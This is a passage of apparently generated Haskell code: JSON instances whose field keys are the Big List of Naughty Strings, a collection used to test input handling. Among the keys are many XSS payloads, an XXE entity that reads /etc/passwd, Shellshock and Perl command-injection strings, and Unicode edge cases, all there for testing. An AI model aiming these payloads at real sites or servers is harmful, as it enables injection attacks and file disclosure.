        , Just $ "0xabad1dea" .= the0Xabad1DeaC
        , Just $ "0xffffffff" .= the0XffffffffC
        , Just $ "--1" .= the1C
        , Just $ "\x0001f435\& \x0001f648\& \x0001f649\& \x0001f64a\&" .= the10C
        , Just $ "-$1.00" .= the100C
        , Just $ "1 000,00" .= the100000C
        , Just $ "1'000'000,00" .= the100000000C
        , Just $ "\x0001f47e\& \x0001f647\& \x0001f481\& \x0001f645\& \x0001f646\& \x0001f64b\& \x0001f64e\& \x0001f64d\&" .= the11C
        , Just $ "-1/2" .= the12C
        , Just $ "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ" .= the13C
        , Just $ "-1E+02" .= the1E02C
        , Just $ "-1E2" .= the1E2C
        , Just $ "-1#IND" .= the1IndC
        , Just $ "⁰⁴⁵" .= the3C
        , Just $ "⅛⅜⅝⅞" .= the4C
        , Just $ "✋\x0001f3ff\& \x0001f4aa\&\x0001f3ff\& \x0001f450\&\x0001f3ff\& \x0001f64c\&\x0001f3ff\& \x0001f44f\&\x0001f3ff\& \x0001f64f\&\x0001f3ff\&" .= the5C
        , Just $ "・(￣∀￣)・:*:" .= the6C
        , Just $ "\x0001d413\&\x0001d421\&\x0001d41e\& \x0001d42a\&\x0001d42e\&\x0001d422\&\x0001d41c\&\x0001d424\& \x0001d41b\&\x0001d42b\&\x0001d428\&\x0001d430\&\x0001d427\& \x0001d41f\&\x0001d428\&\x0001d431\& \x0001d423\&\x0001d42e\&\x0001d426\&\x0001d429\&\x0001d42c\& \x0001d428\&\x0001d42f\&\x0001d41e\&\x0001d42b\& \x0001d42d\&\x0001d421\&\x0001d41e\& \x0001d425\&\x0001d41a\&\x0001d433\&\x0001d432\& \x0001d41d\&\x0001d428\&\x0001d420\&" .= the8C
        , Just $ "\x0001d683\&\x0001d691\&\x0001d68e\& \x0001d69a\&\x0001d69e\&\x0001d692\&\x0001d68c\&\x0001d694\& \x0001d68b\&\x0001d69b\&\x0001d698\&\x0001d6a0\&\x0001d697\& \x0001d68f\&\x0001d698\&\x0001d6a1\& \x0001d693\&\x0001d69e\&\x0001d696\&\x0001d699\&\x0001d69c\& \x0001d698\&\x0001d69f\&\x0001d68e\&\x0001d69b\& \x0001d69d\&\x0001d691\&\x0001d68e\& \x0001d695\&\x0001d68a\&\x0001d6a3\&\x0001d6a2\& \x0001d68d\&\x0001d698\&\x0001d690\&" .= the9C
        , Just $ "-9223372036854775808/-1" .= the92233720368547758081C
        , Just $ "<title onpropertychange=javascript:alert(1)></title><title title=>" .= titleOnpropertychangeJavascriptAlert1TitleTitleTitleC
        , Just $ "# treated as whitespace in some contexts." .= treatedAsWhitespaceInSomeContextsC
        , Just $ "#\tTrick Unicode" .= trickUnicodeC
        , Just $ "true" .= trueC
        , Just $ "undefined" .= undefinedC
        , Just $ "# Unicode additional control characters: all of the characters with" .= unicodeAdditionalControlCharactersAllOfTheCharactersWithC
        , Just $ "#\tUnicode Subscript/Superscript/Accents" .= unicodeSubscriptSuperscriptAccentsC
        , Just $ "#\tUnicode Upsidedown" .= unicodeUpsidedownC
        , Just $ "$USER" .= userC
        , Just $ "--version" .= versionC
        , Just $ "# version 8.0.0), plus U+0009 (HT), U+000B (VT), U+000C (FF), U+0085 (NEL)," .= version800PlusU0009HTU000BVTU000CFFU0085NELC
        , Just $ "# Whitespace: all of the characters with category Zs, Zl, or Zp (in Unicode" .= whitespaceAllOfTheCharactersWithCategoryZsZlOrZpInUnicodeC
        , Just $ "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>" .= xmlVersion10EncodingISO88591DOCTYPEFooELEMENTFooANYENTITYXxeSYSTEMFileEtcPasswdFooXxeFooC
        , Just $ "#      XXE Injection (XML)" .= xxeInjectionXMLC
        , Just $ "#\tZalgo Text" .= zalgoTextC
        , Just $ "ZZ:" .= zzC
        ]

instance FromJSON C where
    parseJSON (Object v) = C
        <$> v .: "┬─┬ノ( º _ ºノ)"
        <*> v .: "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ، "
        <*> v .: "\x0002070e\&\x00020731\&\x00020779\&\x00020c53\&\x00020c78\&\x00020c96\&\x00020ccf\&"
        <*> v .: "١٢٣"
        <*> v .: "울란바토르"
        <*> v .: "A:"
        <*> v .: "<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF"
        <*> v .: "."
        <*> v .: "# and U+007F (DEL)"
        <*> v .: "# ASCII punctuation.  All of these characters may need to be escaped in some"
        <*> v .: "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>"
        <*> v .: "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ"
        <*> v .: "\"'\"'\"''''\""
        <*> v .: "-0.0"
        <*> v .: "0.0/0"
        <*> v .: "-1.00"
        <*> v .: "1,000.00"
        <*> v .: "1,000,000.00"
        <*> v .: "1E+02"
        <*> v .: "><script>alert(123)</script>"
        <*> v .: "CLOCK$"
        <*> v .: "COM2"
        <*> v .: "COM4"
        <*> v .: "Craig Cockburn, Software Specialist"
        <*> v .: "\\\\"
        <*> v .: "DCC SEND STARTKEYLOGGER 0 0 0"
        <*> v .: "dontMakeAMap"
        <*> v .: "#\tEmoji"
        <*> v .: "\"\""
        <*> v .: "evaluate"
        <*> v .: "%"
        <*> v .: "0/0"
        <*> v .: "<foo val=“bar” />"
        <*> v .: "ÅÍÎÏ˝ÓÔ\xf8ff\&ÒÚÆ☃"
        <*> v .: "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟"
        <*> v .: "hasOwnProperty"
        <*> v .: "--"
        <*> v .: "Horniman Museum"
        <*> v .: "http://www.cum.qc.ca/"
        <*> v .: "<i onwheel=alert(1)> Scroll over me </i>"
        <*> v .: "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">"
        <*> v .: "<IMG onmouseover=\"alert('xxs')\">"
        <*> v .: "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"
        <*> v .: "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
        <*> v .: "<IMG SRC=\"javascript:alert('XSS')\""
        <*> v .: "<img src onerror /\" '\"= alt=javascript:alert(1)//\">"
        <*> v .: "<img src\\x10=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src\\x12=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src\\x13=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src\\x32=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src\\x47=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src=x onerror=alert(123) />"
        <*> v .: "<img src=x onerror=\\x10\"javascript:alert(1)\">"
        <*> v .: "<img src=x onerror=\\x32\"javascript:alert(1)\">"
        <*> v .: "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>"
        <*> v .: "`\"'><img src=xxx:x \\x09onerror=javascript:alert(1)>"
        <*> v .: "`\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>"
        <*> v .: "`\"'><img src=xxx:x \\x22onerror=javascript:alert(1)>"
        <*> v .: "`\"'><img src=xxx:x \\x27onerror=javascript:alert(1)>"
        <*> v .: "<img\\x11src=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img \\x34src=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img\\x47src=x onerror=\"javascript:alert(1)\">"
        <*> v .: "-"
        <*> v .: ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’"
        <*> v .: "Infinity"
        <*> v .: "JavaSCript:alert(123)"
        <*> v .: "LPT1"
        <*> v .: "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;"
        <*> v .: "_"
        <*> v .: "magna cum laude"
        <*> v .: "medieval erection of parapets"
        <*> v .: "ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя"
        <*> v .: "mocha"
        <*> v .: "NaN"
        <*> v .: "# Non-whitespace C0 controls: U+0001 through U+0008, U+000E through U+001F,"
        <*> v .: "NULL"
        <*> v .: "' onfocus=JaVaSCript:alert(123) autofocus"
        <*> v .: "# or reused for internal delimiters on the theory that they should never"
        <*> v .: "<plaintext>"
        <*> v .: "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗"
        <*> v .: "\"''''\"'\""
        <*> v .: "0,,0"
        <*> v .: "1.000,00"
        <*> v .: "1.000.000,00"
        <*> v .: "＜script＞alert(123)＜/script＞"
        <*> v .: "#\tRight-To-Left Strings"
        <*> v .: "Roses are \x001b\&[0;31mred\x001b\&[0m, violets are \x001b\&[0;34mblue. Hope you enjoy terminal hue"
        <*> v .: "%*.*s"
        <*> v .: "'><script>alert(123)</script>"
        <*> v .: "'><script>alert(123);</script x='"
        <*> v .: "\"`'><script>-javascript:alert(1)</script>"
        <*> v .: "< / script >< script >alert(123)< / script >"
        <*> v .: "<script src=\"/\\%(jscript)s\"></script>"
        <*> v .: "\"`'><script>\\x0Ajavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\x0Bjavascript:alert(1)</script>"
        <*> v .: "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>"
        <*> v .: "\"`'><script>\\x20javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\x2Bjavascript:alert(1)</script>"
        <*> v .: "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>"
        <*> v .: "\"`'><script>\\x7Ejavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x80javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x82javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x83javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x84javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x88javascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>"
        <*> v .: "\"`'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>"
        <*> v .: "Scunthorpe General Hospital"
        <*> v .: "#\tServer Code Injection"
        <*> v .: "shitake mushrooms"
        <*> v .: "#\tSpecial Characters"
        <*> v .: "src=JaVaSCript:prompt(132)"
        <*> v .: "(ﾉಥ益ಥ）ﾉ\xfeff\& ┻━┻"
        <*> v .: "#\tStrings which can be interpreted as numeric"
        <*> v .: "#\tStrings which can cause a SQL injection if inputs are not sanitized"
        <*> v .: "#\tStrings which can cause user to pull in files that should not be a part of a web server"
        <*> v .: "#\tStrings which can cause user to run code on server as a privileged user (c.f. https://news.ycombinator.com/item?id=7665153)"
        <*> v .: "#\tStrings which contain \"corrupted\" text. The corruption will not appear in non-HTML text, however. (via http://www.eeemo.net)"
        <*> v .: "#\tStrings which contain unicode with an \"upsidedown\" effect (via http://www.upsidedowntext.com)"
        <*> v .: "#\tStrings which contain unicode with unusual properties (e.g. Right-to-left override) (c.f. http://www.unicode.org/charts/PDF/U2000.pdf)"
        <*> v .: "#\tStrings which punish the fools who use cat/type on this file"
        <*> v .: "<svg><script>123<1>alert(123)</script>"
        <*> v .: "System(\"ls -al /\")"
        <*> v .: "@{[system \"touch /tmp/blns.fail\"]}"
        <*> v .: "''"
        <*> v .: "\x2029\&test\x2029\&"
        <*> v .: "test\x2060\&test\x202b\&"
        <*> v .: "\x0001f3f3\&0\x0001f308\&️"
        <*> v .: "+0.0"
        <*> v .: "0.0.0"
        <*> v .: "0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ \x0001f51f\&"
        <*> v .: "() { 0; }; touch /tmp/blns.shellshock1.fail;"
        <*> v .: "0xabad1dea"
        <*> v .: "0xffffffff"
        <*> v .: "--1"
        <*> v .: "\x0001f435\& \x0001f648\& \x0001f649\& \x0001f64a\&"
        <*> v .: "-$1.00"
        <*> v .: "1 000,00"
        <*> v .: "1'000'000,00"
        <*> v .: "\x0001f47e\& \x0001f647\& \x0001f481\& \x0001f645\& \x0001f646\& \x0001f64b\& \x0001f64e\& \x0001f64d\&"
        <*> v .: "-1/2"
        <*> v .: "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ"
        <*> v .: "-1E+02"
        <*> v .: "-1E2"
        <*> v .: "-1#IND"
        <*> v .: "⁰⁴⁵"
        <*> v .: "⅛⅜⅝⅞"
        <*> v .: "✋\x0001f3ff\& \x0001f4aa\&\x0001f3ff\& \x0001f450\&\x0001f3ff\& \x0001f64c\&\x0001f3ff\& \x0001f44f\&\x0001f3ff\& \x0001f64f\&\x0001f3ff\&"
        <*> v .: "・(￣∀￣)・:*:"
        <*> v .: "\x0001d413\&\x0001d421\&\x0001d41e\& \x0001d42a\&\x0001d42e\&\x0001d422\&\x0001d41c\&\x0001d424\& \x0001d41b\&\x0001d42b\&\x0001d428\&\x0001d430\&\x0001d427\& \x0001d41f\&\x0001d428\&\x0001d431\& \x0001d423\&\x0001d42e\&\x0001d426\&\x0001d429\&\x0001d42c\& \x0001d428\&\x0001d42f\&\x0001d41e\&\x0001d42b\& \x0001d42d\&\x0001d421\&\x0001d41e\& \x0001d425\&\x0001d41a\&\x0001d433\&\x0001d432\& \x0001d41d\&\x0001d428\&\x0001d420\&"
        <*> v .: "\x0001d683\&\x0001d691\&\x0001d68e\& \x0001d69a\&\x0001d69e\&\x0001d692\&\x0001d68c\&\x0001d694\& \x0001d68b\&\x0001d69b\&\x0001d698\&\x0001d6a0\&\x0001d697\& \x0001d68f\&\x0001d698\&\x0001d6a1\& \x0001d693\&\x0001d69e\&\x0001d696\&\x0001d699\&\x0001d69c\& \x0001d698\&\x0001d69f\&\x0001d68e\&\x0001d69b\& \x0001d69d\&\x0001d691\&\x0001d68e\& \x0001d695\&\x0001d68a\&\x0001d6a3\&\x0001d6a2\& \x0001d68d\&\x0001d698\&\x0001d690\&"
        <*> v .: "-9223372036854775808/-1"
        <*> v .: "<title onpropertychange=javascript:alert(1)></title><title title=>"
        <*> v .: "# treated as whitespace in some contexts."
        <*> v .: "#\tTrick Unicode"
        <*> v .: "true"
        <*> v .: "undefined"
        <*> v .: "# Unicode additional control characters: all of the characters with"
        <*> v .: "#\tUnicode Subscript/Superscript/Accents"
        <*> v .: "#\tUnicode Upsidedown"
        <*> v .: "$USER"
        <*> v .: "--version"
        <*> v .: "# version 8.0.0), plus U+0009 (HT), U+000B (VT), U+000C (FF), U+0085 (NEL),"
        <*> v .: "# Whitespace: all of the characters with category Zs, Zl, or Zp (in Unicode"
        <*> v .: "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
        <*> v .: "#      XXE Injection (XML)"
        <*> v .: "#\tZalgo Text"
        <*> v .: "ZZ:"
